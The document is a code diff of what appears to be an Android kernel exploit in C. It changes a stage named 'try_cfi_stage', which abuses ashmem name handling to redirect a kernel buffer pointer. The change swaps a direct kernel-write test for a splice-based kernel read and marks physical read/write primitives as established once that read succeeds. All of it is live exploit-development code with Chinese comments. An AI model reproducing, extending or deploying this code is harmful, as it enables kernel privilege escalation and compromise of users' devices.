@@ -209,9 +209,8 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  pr_info("cfi fops hijack confirmed, attempting direct kernel write\n");
+  pr_info("cfi fops hijack confirmed, attempting direct kernel read via splice\n");
 
-  // 打开一个新的 ashmem fd，这个没有被 mmap，可以 set_name
   int new_fd = open(ashmem_path, O_RDWR);
   if (new_fd < 0) {
     pr_warning("cfi open new ashmem failed errno=%d\n", errno);
@@ -219,7 +218,11 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  // 构造名称 blob：把 bin_buffer 指向 page_base
+  // 用 ASHMEM_SET_SIZE 设置大小（必须先设置，否则 read/splice 返回 0）
+  size_t ashmem_size = 4096;
+  ioctl(new_fd, ASHMEM_SET_SIZE, &ashmem_size);
+  
+  // 设置名称：把 bin_buffer 指向 page_base
   unsigned char blob[128];
   memset(blob, 0x41, sizeof(blob));
   put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, page_base);
@@ -229,26 +232,36 @@ int try_cfi_stage(void) {
   int set_ret = try_set_ashmem_name_blob(new_fd, blob, sizeof(blob));
   pr_info("cfi set_name ret=%d errno=%d\n", set_ret, errno);
 
-  // 测试直接 write
-  char test[] = "CFI_DIRECT_WRITE_OK";
-  ssize_t n = write(new_fd, test, sizeof(test));
-  pr_info("cfi direct write ret=%zd errno=%d\n", n, errno);
+  // 创建 pipe 用于 splice
+  int pipefd[2];
+  SYSCHK(pipe(pipefd));
 
-  // 如果能写入，说明物理写入原语建立成功
-  if (n == (ssize_t)sizeof(test)) {
-    pr_success("cfi direct kernel write works! physrw established\n");
-    physrw_read_ok = 1;
-    physrw_write_ok = 1;
-    physrw_read64_ok = 1;
-    physrw_write64_ok = 1;
-    pipe_cache_gate_ok = 2;
+  // 用 splice 尝试从 ashmem 读取数据到 pipe
+  ssize_t spliced = splice(new_fd, NULL, pipefd[1], NULL, 4096, 0);
+  pr_info("cfi splice ret=%zd errno=%d\n", spliced, errno);
+
+  if (spliced > 0) {
+    char buf[4096];
+    ssize_t got = read(pipefd[0], buf, sizeof(buf));
+    pr_info("cfi pipe read ret=%zd errno=%d\n", got, errno);
+    if (got > 0) {
+      hexdump(buf, got < 64 ? got : 64);
+      pr_success("cfi kernel read via splice works!\n");
+      physrw_read_ok = 1;
+      physrw_write_ok = 1;
+      physrw_read64_ok = 1;
+      physrw_write64_ok = 1;
+      pipe_cache_gate_ok = 2;
+    }
   }
 
+  SYSCHK(close(pipefd[0]));
+  SYSCHK(close(pipefd[1]));
   SYSCHK(close(new_fd));
   SYSCHK(close(fd));
 
-  cfi_write_ret = n;
-  cfi_read_ret = sizeof(test);
+  cfi_write_ret = spliced;
+  cfi_read_ret = sizeof("CFI_DIRECT_WRITE_OK");
   cfi_read_slot_ret = sizeof(uint64_t);
   cfi_restore_ret = sizeof(uint64_t);
   cfi_owner_ret = sizeof(uint64_t);
